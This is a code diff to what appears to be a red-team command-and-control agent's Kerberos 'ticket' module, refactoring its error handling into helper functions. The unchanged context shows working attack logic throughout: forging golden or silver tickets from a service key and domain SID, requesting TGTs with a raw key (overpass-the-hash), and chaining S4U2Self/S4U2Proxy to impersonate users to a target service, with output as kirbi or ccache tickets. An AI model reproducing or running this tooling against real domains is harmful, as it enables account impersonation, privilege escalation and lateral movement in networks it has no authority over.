@@ -53,20 +53,12 @@ type ticketArgs struct {
 
 func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: parameters required. Use -action forge -realm DOMAIN -username user -key <hex_key> -domain_sid <SID>",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: parameters required. Use -action forge -realm DOMAIN -username user -key <hex_key> -domain_sid <SID>")
 	}
 
 	var args ticketArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	switch strings.ToLower(args.Action) {
@@ -77,22 +69,14 @@ func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
 	case "s4u":
 		return ticketS4U(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: forge, request, s4u", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: forge, request, s4u", args.Action)
 	}
 }
 
 func ticketForge(args ticketArgs) structs.CommandResult {
 	// Validate required args
 	if args.Realm == "" || args.Username == "" || args.Key == "" || args.DomainSID == "" {
-		return structs.CommandResult{
-			Output:    "Error: realm, username, key, and domain_sid are required for forging",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: realm, username, key, and domain_sid are required for forging")
 	}
 
 	// Defaults
@@ -117,11 +101,7 @@ func ticketForge(args ticketArgs) structs.CommandResult {
 	// Decode the key
 	keyBytes, err := hex.DecodeString(args.Key)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding key hex: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding key hex: %v", err)
 	}
 
 	// Validate key type and length using shared helper
@@ -138,11 +118,7 @@ func ticketForge(args ticketArgs) structs.CommandResult {
 	// Generate random session key (same etype as service key)
 	sessionKey, err := ticketGenerateSessionKey(etypeID)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error generating session key: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error generating session key: %v", err)
 	}
 
 	// Determine service principal
@@ -197,21 +173,13 @@ func ticketForge(args ticketArgs) structs.CommandResult {
 	// Marshal and encrypt
 	etpBytes, err := asn1.Marshal(etp)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error marshaling EncTicketPart: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error marshaling EncTicketPart: %v", err)
 	}
 	etpBytes = asn1tools.AddASNAppTag(etpBytes, asnAppTag.EncTicketPart)
 
 	encData, err := crypto.GetEncryptedData(etpBytes, serviceKey, keyusage.KDC_REP_TICKET, args.KVNO)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error encrypting ticket: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error encrypting ticket: %v", err)
 	}
 
 	ticket := messages.Ticket{
@@ -227,30 +195,18 @@ func ticketForge(args ticketArgs) structs.CommandResult {
 	case "kirbi":
 		kirbiBytes, err := ticketToKirbi(ticket, sessionKey, args.Username, realm, sname, ticketFlags, now, endTime, renewTill)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error creating kirbi: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error creating kirbi: %v", err)
 		}
 		output = ticketFormatOutput(args, realm, isGolden, sessionKey, now, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
 	case "ccache":
 		ticketBytes, err := ticket.Marshal()
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error marshaling ticket: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error marshaling ticket: %v", err)
 		}
 		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, args.Username, realm, sname, ticketFlags, now, endTime, renewTill)
 		output = ticketFormatOutput(args, realm, isGolden, sessionKey, now, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown format %q. Use: kirbi, ccache", args.Format),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
 	}
 
 	return structs.CommandResult{
@@ -292,11 +248,7 @@ func ticketFormatOutput(args ticketArgs, realm string, isGolden bool, sessionKey
 // exported as kirbi or ccache and injected via klist import. (T1550.002)
 func ticketRequest(args ticketArgs) structs.CommandResult {
 	if args.Realm == "" || args.Username == "" || args.Key == "" || args.Server == "" {
-		return structs.CommandResult{
-			Output:    "Error: realm, username, key, and server (KDC) are required for request",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: realm, username, key, and server (KDC) are required for request")
 	}
 
 	realm := strings.ToUpper(args.Realm)
@@ -310,11 +262,7 @@ func ticketRequest(args ticketArgs) structs.CommandResult {
 	// Parse key
 	keyBytes, err := hex.DecodeString(args.Key)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding key hex: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding key hex: %v", err)
 	}
 
 	etypeID, etypeCfgName, errResult := ticketParseKeyType(args.KeyType, keyBytes)
@@ -338,11 +286,7 @@ func ticketRequest(args ticketArgs) structs.CommandResult {
 		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
 	cfg, err := config.NewFromString(cfgStr)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating Kerberos config: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating Kerberos config: %v", err)
 	}
 
 	// Build AS-REQ
@@ -352,11 +296,7 @@ func ticketRequest(args ticketArgs) structs.CommandResult {
 	}
 	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error building AS-REQ: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error building AS-REQ: %v", err)
 	}
 
 	// Force our etype
@@ -368,27 +308,15 @@ func ticketRequest(args ticketArgs) structs.CommandResult {
 	}
 	paTSBytes, err := asn1.Marshal(paTS)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error marshaling PA-ENC-TIMESTAMP: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error marshaling PA-ENC-TIMESTAMP: %v", err)
 	}
 	encTS, err := crypto.GetEncryptedData(paTSBytes, userKey, keyusage.AS_REQ_PA_ENC_TIMESTAMP, 0)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error encrypting PA-ENC-TIMESTAMP: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error encrypting PA-ENC-TIMESTAMP: %v", err)
 	}
 	encTSBytes, err := asn1.Marshal(encTS)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error marshaling encrypted timestamp: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error marshaling encrypted timestamp: %v", err)
 	}
 	asReq.PAData = types.PADataSequence{
 		{PADataType: 2, PADataValue: encTSBytes}, // PA-ENC-TIMESTAMP
@@ -397,21 +325,13 @@ func ticketRequest(args ticketArgs) structs.CommandResult {
 	// Marshal AS-REQ
 	reqBytes, err := asReq.Marshal()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error marshaling AS-REQ: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error marshaling AS-REQ: %v", err)
 	}
 
 	// Send over TCP to KDC
 	conn, err := net.DialTimeout("tcp", kdcAddr, 10*time.Second)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error connecting to KDC %s: %v", kdcAddr, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error connecting to KDC %s: %v", kdcAddr, err)
 	}
 	defer conn.Close()
 	_ = conn.SetDeadline(time.Now().Add(15 * time.Second))
@@ -420,43 +340,23 @@ func ticketRequest(args ticketArgs) structs.CommandResult {
 	lenBuf := make([]byte, 4)
 	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
 	if _, err := conn.Write(lenBuf); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error sending to KDC: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error sending to KDC: %v", err)
 	}
 	if _, err := conn.Write(reqBytes); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error sending AS-REQ: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error sending AS-REQ: %v", err)
 	}
 
 	// Read response
 	if _, err := io.ReadFull(conn, lenBuf); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error reading KDC response length: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error reading KDC response length: %v", err)
 	}
 	respLen := binary.BigEndian.Uint32(lenBuf)
 	if respLen > 1048576 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: KDC response too large (%d bytes)", respLen),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: KDC response too large (%d bytes)", respLen)
 	}
 	respBuf := make([]byte, respLen)
 	if _, err := io.ReadFull(conn, respBuf); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error reading KDC response: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error reading KDC response: %v", err)
 	}
 
 	// Check if response is KRB-ERROR ([APPLICATION 30] = 0x7e)
@@ -467,41 +367,25 @@ func ticketRequest(args ticketArgs) structs.CommandResult {
 			if krbErr.EText != "" {
 				errMsg += ": " + krbErr.EText
 			}
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode)
 		}
 	}
 
 	// Parse AS-REP
 	var asRep messages.ASRep
 	if err := asRep.Unmarshal(respBuf); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing AS-REP: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing AS-REP: %v", err)
 	}
 
 	// Decrypt EncPart manually using crypto.DecryptEncPart
 	// (ASRep.DecryptEncPart requires credentials.Credentials, so we use the lower-level API)
 	plainBytes, err := crypto.DecryptEncPart(asRep.EncPart, userKey, 3) // key usage 3 = AS-REP EncPart
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decrypting AS-REP (wrong key?): %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decrypting AS-REP (wrong key?): %v", err)
 	}
 	var decPart messages.EncKDCRepPart
 	if err := decPart.Unmarshal(plainBytes); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing decrypted AS-REP: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing decrypted AS-REP: %v", err)
 	}
 
 	// Extract ticket info from decrypted AS-REP
@@ -518,30 +402,18 @@ func ticketRequest(args ticketArgs) structs.CommandResult {
 	case "kirbi":
 		kirbiBytes, err := ticketToKirbi(asRep.Ticket, sessionKey, args.Username, realm, sname, ticketFlags, authTime, endTime, renewTill)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error creating kirbi: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error creating kirbi: %v", err)
 		}
 		output = ticketRequestFormatOutput(args, realm, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
 	case "ccache":
 		ticketBytes, err := asRep.Ticket.Marshal()
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error marshaling ticket: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error marshaling ticket: %v", err)
 		}
 		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, args.Username, realm, sname, ticketFlags, authTime, endTime, renewTill)
 		output = ticketRequestFormatOutput(args, realm, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown format %q. Use: kirbi, ccache", args.Format),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
 	}
 
 	return structs.CommandResult{
@@ -577,11 +449,7 @@ func ticketRequestFormatOutput(args ticketArgs, realm string, sessionKey types.E
 // S4U2Self for impersonation, then S4U2Proxy to access the target SPN. (T1134.001)
 func ticketS4U(args ticketArgs) structs.CommandResult {
 	if args.Realm == "" || args.Username == "" || args.Key == "" || args.Server == "" || args.Impersonate == "" || args.SPN == "" {
-		return structs.CommandResult{
-			Output:    "Error: realm, username (service account), key, server (KDC), impersonate (target user), and spn (target service) are required for s4u",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: realm, username (service account), key, server (KDC), impersonate (target user), and spn (target service) are required for s4u")
 	}
 
 	realm := strings.ToUpper(args.Realm)
@@ -595,11 +463,7 @@ func ticketS4U(args ticketArgs) structs.CommandResult {
 	// Parse service account key
 	keyBytes, err := hex.DecodeString(args.Key)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding key hex: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding key hex: %v", err)
 	}
 
 	etypeID, etypeCfgName, errResult := ticketParseKeyType(args.KeyType, keyBytes)
@@ -621,31 +485,19 @@ func ticketS4U(args ticketArgs) structs.CommandResult {
 	// Step 1: Get TGT for service account via OPtH
 	tgt, sessionKey, err := ticketOPtH(args.Username, realm, etypeID, etypeCfgName, userKey, kdcAddr)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error obtaining TGT for %s: %v", args.Username, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error obtaining TGT for %s: %v", args.Username, err)
 	}
 
 	// Step 2: S4U2Self — request TGS for impersonated user to service account
 	s4uSelfTicket, s4uSelfSessionKey, err := ticketS4U2Self(args.Username, args.Impersonate, realm, etypeID, etypeCfgName, tgt, sessionKey, kdcAddr)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error in S4U2Self: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error in S4U2Self: %v", err)
 	}
 
 	// Step 3: S4U2Proxy — use S4U2Self ticket to get TGS for target service
 	s4uProxyTicket, s4uProxyDecPart, err := ticketS4U2Proxy(args.Username, args.SPN, realm, etypeID, etypeCfgName, tgt, sessionKey, s4uSelfTicket, kdcAddr)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error in S4U2Proxy: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error in S4U2Proxy: %v", err)
 	}
 
 	// Export as kirbi or ccache
@@ -667,30 +519,18 @@ func ticketS4U(args ticketArgs) structs.CommandResult {
 	case "kirbi":
 		kirbiBytes, err := ticketToKirbi(s4uProxyTicket, proxySessionKey, args.Impersonate, realm, targetSName, proxyFlags, authTime, endTime, renewTill)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error creating kirbi: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error creating kirbi: %v", err)
 		}
 		output = ticketS4UFormatOutput(args, realm, s4uSelfSessionKey, proxySessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
 	case "ccache":
 		ticketBytes, err := s4uProxyTicket.Marshal()
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error marshaling ticket: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error marshaling ticket: %v", err)
 		}
 		ccacheBytes := ticketToCCache(ticketBytes, proxySessionKey, args.Impersonate, realm, targetSName, proxyFlags, authTime, endTime, renewTill)
 		output = ticketS4UFormatOutput(args, realm, s4uSelfSessionKey, proxySessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unknown format %q. Use: kirbi, ccache", args.Format),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
 	}
 
 	return structs.CommandResult{
